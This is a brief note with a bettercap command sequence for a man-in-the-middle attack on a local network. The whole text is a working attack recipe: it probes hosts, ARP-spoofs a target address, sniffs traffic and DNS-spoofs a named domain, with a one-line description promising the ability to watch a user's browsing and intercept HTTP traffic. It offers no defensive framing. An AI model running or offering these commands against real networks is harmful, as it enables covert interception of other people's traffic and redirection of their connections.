This allows you to watch domains user goes to, intercept all http traffic, and also potentially do arp spoofing and dns redirection.

```
bettercap

net.probe on
net.show
set arp.spoof.targets 10.0.0.1
arp.spoof on
net.sniff on

set dns.spoof.domains ni.com
dns.spoof on
```